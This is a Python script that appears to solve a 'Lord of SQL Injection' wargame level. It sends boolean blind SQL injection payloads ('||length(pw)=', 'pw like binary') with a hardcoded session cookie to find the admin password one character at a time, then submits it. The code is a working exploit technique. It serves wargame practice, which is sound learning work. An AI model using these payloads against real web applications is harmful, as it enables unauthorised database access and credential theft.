import requests

headers={'Cookie': 'PHPSESSID=2t0891ivjv5shc7tpfokfq5pj6'}

url="https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php"
choice="789456123qwertyuiopasdfghjklzxcvbnm"
length=0
'''
for i in range(10):
    param="?pw='||length(pw)="+str(i)+"-- -"
    base= url+param
    print (i)
    page=requests.get(base,headers=headers)
    if "Hello admin" in page.text:
        length=i
        print(length)
        break
'''
passwd=''
length=8
for i in range (1,9):
    for j in choice:
        param="?no=9|| pw like binary \""+passwd+j+"%\"-- -"
        base=url+param
        page=requests.get(base,headers=headers) 
        print("trying :: "+str(i)+"-_-"+ (passwd+j))
        if "Hello admin" in page.text:
            print(base)
            passwd=passwd+(j)
            print (passwd)
            break            

print(passwd)
print("done")

param="?pw="+passwd
base=url+param
page=requests.get(base,headers=headers)
if "Clear" in page.text:
    print("Success:)")
else:
    print("NVM")
